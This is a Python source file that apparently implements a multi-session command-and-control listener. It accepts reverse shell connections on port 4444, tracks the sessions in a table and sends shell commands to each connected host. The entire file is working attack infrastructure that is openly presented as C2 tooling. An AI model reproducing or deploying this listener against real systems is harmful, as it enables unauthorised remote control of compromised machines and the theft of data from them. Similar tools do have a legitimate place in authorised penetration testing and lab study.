"""
Aadi — Multi-Session C2 TCP Listener (Optimized, Thread-Safe & Secured)
Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
"""

import socket
import threading
from typing import Dict, Tuple, Optional
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
from rich import box

console = Console()

active_connections: Dict[str, socket.socket] = {}
connection_lock = threading.Lock()
listener_thread: Optional[threading.Thread] = None
server_socket: Optional[socket.socket] = None
is_running: bool = False


def handle_client(client_socket: socket.socket, addr: Tuple[str, int]) -> None:
    """Handle individual incoming client shell connection safely."""
    client_id = f"{addr[0]}:{addr[1]}"

    with connection_lock:
        active_connections[client_id] = client_socket

    console.print(f"\n[bold green][+] New reverse shell session established from {client_id}![/]")

    try:
        while is_running:
            # यहाँ क्लाइंट से आने वाले डेटा को रिसीव किया जा रहा है
            client_socket.settimeout(0.5)
            try:
                data = client_socket.recv(4096)
                if not data:
                    break
                # आउटपुट प्रिंट करें या लॉग करें
                output = data.decode('utf-8', errors='ignore')
                if output.strip():
                    console.print(f"\n[cyan][{client_id} output]:[/]\n{output}")
            except socket.timeout:
                continue
    except Exception:
        pass
    finally:
        try:
            client_socket.close()
        except Exception:
            pass

        with connection_lock:
            if client_id in active_connections:
                del active_connections[client_id]

        console.print(f"\n[bold red][-] Session {client_id} disconnected.[/]")


def send_command_to_session(client_id: str, command: str) -> bool:
    """Send a shell command to a specific active C2 session."""
    with connection_lock:
        sock = active_connections.get(client_id)
        if not sock:
            console.print(f"[bold red]✗ Session {client_id} not found or inactive.[/]")
            return False

        try:
            sock.sendall((command + "\n").encode('utf-8'))
            console.print(f"[bold green]✓ Command sent to {client_id}: {command}[/]")
            return True
        except Exception as e:
            console.print(f"[bold red]✗ Failed to send command to {client_id}: {e}[/]")
            return False


def start_listener(port: int = 4444) -> None:
    """Start background TCP listener socket with robust threading and locking."""
    global server_socket, is_running, listener_thread

    if is_running:
        console.print("[yellow][!] C2 Listener is already running.[/]")
        return

    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", port))
        server_socket.listen(5)
        is_running = True

        def server_loop() -> None:
            while is_running and server_socket:
                try:
                    server_socket.settimeout(1.0)
                    client, addr = server_socket.accept()
                    t = threading.Thread(target=handle_client, args=(client, addr), daemon=True)
                    t.start()
                except socket.timeout:
                    continue
                except Exception:
                    break

        listener_thread = threading.Thread(target=server_loop, daemon=True)
        listener_thread.start()
        console.print(f"[bold green]✓ C2 Multi-Session Listener started on port {port}[/]")
    except Exception as e:
        console.print(f"[bold red]✗ Failed to start listener on port {port}:[/] {e}")
        is_running = False


def stop_listener() -> None:
    """Stop the C2 listener and close all active client sessions gracefully."""
    global is_running, server_socket
    is_running = False

    with connection_lock:
        for cid, sock in list(active_connections.items()):
            try:
                sock.close()
            except Exception:
                pass
        active_connections.clear()

    if server_socket:
        try:
            server_socket.close()
        except Exception:
            pass
        server_socket = None

    console.print("[bold yellow][*] C2 Listener stopped and connections cleared.[/]")


def list_sessions() -> None:
    """Display active reverse shell sessions in a rich table format."""
    t = Table(title="[bold cyan]Active C2 Sessions[/]", box=box.ROUNDED, border_style="cyan")
    t.add_column("Session ID / Address", style="bold white")
    t.add_column("Status", style="green")

    with connection_lock:
        if not active_connections:
            t.add_row("No active sessions", "Idle")
        else:
            for cid in active_connections.keys():
                t.add_row(cid, "Connected (Interactive)")

    console.print(t)